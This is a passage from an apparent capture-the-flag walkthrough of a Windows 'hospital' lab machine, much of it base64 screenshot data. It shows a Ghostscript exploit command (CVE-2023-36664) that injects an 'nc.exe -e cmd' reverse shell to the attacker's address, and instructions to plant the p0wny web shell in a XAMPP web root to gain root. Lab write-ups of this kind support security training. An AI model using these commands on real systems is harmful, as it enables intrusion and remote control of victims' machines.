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" width="570" height="105" class="img_ev3q"></p>
<p>The attacker proceeds to create and send another malicious .eps file, this time the code injection will tell the victim machine to execute nc.exe and send a reverse shell to the attacker&#x27;s machine.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">python CVE_023_36664_exploit.py --inject --payload &#x27;nc.exe -e cmd 10.10.14.26 9001&#x27; --filename file.eps</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="ghostscript reverse shell injection" src="/assets/images/ghostscript_reverse_shell-1605df1139ecb27f5a8775c2ff20c147.png" width="768" height="37" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="composing another email" src="/assets/images/composing_email_2-096dd641cc10e5e1c5d41a239e975801.png" width="768" height="345" class="img_ev3q"></p>
<p>A reverse shell connection is established, granting the attacker access to the victim machine.</p>
<p><img decoding="async" loading="lazy" alt="ps shell received" src="/assets/images/recv_ps_shell_1-9e678cce0aa78c5e75418adcfe103194.png" width="536" height="215" class="img_ev3q"></p>
<p>The user flag is at <strong>C:\Users\drbrown.HOSPITAL\Desktop</strong></p>
<p><img decoding="async" loading="lazy" alt="shell as drbrown" src="/assets/images/whoami_drbrown_1-4bf5d50223d5b3fedf67d82ae8a755c6.png" width="447" height="327" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="root">Root<a href="#root" class="hash-link" aria-label="Direct link to Root" title="Direct link to Root" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution-1-xampp-misconfiguration">solution 1 (XAMPP misconfiguration)<a href="#solution-1-xampp-misconfiguration" class="hash-link" aria-label="Direct link to solution 1 (XAMPP misconfiguration)" title="Direct link to solution 1 (XAMPP misconfiguration)" translate="no">​</a></h3>
<p>Go to C:\xampp\htdocs and upload the <a href="https://github.com/flozz/p0wny-shell" target="_blank" rel="noopener noreferrer">p0wny-shell</a> there.</p>
<p>serving the p0wny shell</p>
<p><img decoding="async" loading="lazy" alt="serving p0wny" src="data:image/png;base64,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